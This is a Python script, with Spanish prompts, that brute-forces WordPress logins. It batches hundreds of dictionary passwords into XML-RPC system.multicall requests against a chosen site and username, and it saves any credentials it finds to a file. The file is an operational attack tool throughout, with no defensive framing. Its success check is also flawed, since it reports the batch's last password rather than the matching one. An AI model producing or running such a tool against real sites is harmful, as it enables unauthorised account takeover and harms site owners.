import requests
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    """Imprime el banner de inicio"""
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
║                  WORDPRESS EXPLOIT                      ║
║                  XML-RPC Multi-Call Attack               ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def get_user_input():
    """Obtiene el target URL y el batch size del usuario"""
    print_banner()
    
    # Obtener URL target
    target_url = input(f"{Fore.CYAN}[+] Ingresa la URL target (ej: https://example.com/xmlrpc.php): {Style.RESET_ALL}").strip()
    if not target_url:
        print(f"{Fore.RED}[-] URL no válida. Abortando...{Style.RESET_ALL}")
        exit(1)
    
    # Obtener username
    username = input(f"{Fore.CYAN}[+] Ingresa el nombre de usuario a atacar: {Style.RESET_ALL}").strip()
    if not username:
        print(f"{Fore.RED}[-] Usuario no válido. Abortando...{Style.RESET_ALL}")
        exit(1)
    
    # Obtener diccionario
    dictionary_path = input(f"{Fore.CYAN}[+] Ingresa la ruta del diccionario: {Style.RESET_ALL}").strip()
    if not os.path.exists(dictionary_path):
        print(f"{Fore.RED}[-] Archivo no encontrado: {dictionary_path}{Style.RESET_ALL}")
        exit(1)
    
    # Obtener batch size
    print(f"\n{Fore.YELLOW}[*] Elige el tamaño del lote:{Style.RESET_ALL}")
    batch_options = {
        "1": 100,
        "2": 200,
        "3": 300,
        "4": 400,
        "5": 500
    }
    
    for key, value in batch_options.items():
        print(f"    {key}. {value} passwords por lote")
    
    choice = input(f"\n{Fore.CYAN}[+] Selecciona una opción (1-5): {Style.RESET_ALL}").strip()
    
    if choice not in batch_options:
        print(f"{Fore.RED}[-] Opción no válida. Usando valor por defecto (500)...{Style.RESET_ALL}")
        batch_size = 500
    else:
        batch_size = batch_options[choice]
    
    print(f"\n{Fore.GREEN}[✓] Configuración establecida:{Style.RESET_ALL}")
    print(f"    URL: {target_url}")
    print(f"    Usuario: {username}")
    print(f"    Diccionario: {dictionary_path}")
    print(f"    Lote: {batch_size} passwords\n")
    
    return target_url, username, dictionary_path, batch_size

def send_batch(url, user, pwd_list):
    xml = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for pwd in pwd_list:
        pwd_clean = pwd.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        xml += f'''
        <value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>{user}</string></value>
                <value><string>{pwd_clean}</string></value>
            </data></array></value></member>
        </struct></value>'''
    xml += '</data></array></value></param></params></methodCall>'
    
    headers = {'Content-Type': 'text/xml'}
    try:
        response = requests.post(url, data=xml, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        print(f"{Fore.RED}[-] Error de conexión: {e}{Style.RESET_ALL}")
        return None

def main():
    url, username, dictionary_path, batch_size = get_user_input()
    
    print(f"{Fore.YELLOW}[*] Iniciando ataque contra {username} en {url}...{Style.RESET_ALL}\n")
    current_batch = []
    password_count = 0
    
    try:
        with open(dictionary_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                if not password: 
                    continue
                
                current_batch.append(password)
                password_count += 1
                
                if len(current_batch) >= batch_size:
                    result = send_batch(url, username, current_batch)
                    
                    if result and 'isAdmin' in result: 
                        print(f"{Fore.GREEN}[!] ¡ÉXITO POTENCIAL! Credenciales encontradas:{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Password: {password}{Style.RESET_ALL}")
                        with open("resultado_exitoso.txt", "w") as out:
                            out.write(f"Usuario: {username}\nPassword: {password}\n\nRespuesta del servidor:\n{result}")
                        break
                    
                    print(f"{Fore.CYAN}[+] Lote enviado ({len(current_batch)} passwords). "
                          f"Total probadas: {password_count}. "
                          f"Última: {password}{Style.RESET_ALL}")
                    current_batch = []
                    time.sleep(1)
        
        # Enviar último lote si quedan passwords
        if current_batch:
            result = send_batch(url, username, current_batch)
            if result and 'isAdmin' in result:
                print(f"{Fore.GREEN}[!] ¡ÉXITO POTENCIAL! Credenciales encontradas:{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Usuario: {username}{Style.RESET_ALL}")
                with open("resultado_exitoso.txt", "w") as out:
                    out.write(result)
        
        print(f"\n{Fore.YELLOW}[*] Ataque completado. Total de passwords probadas: {password_count}{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Ataque interrumpido por el usuario.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error durante el ataque: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Programa terminado.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error fatal: {e}{Style.RESET_ALL}")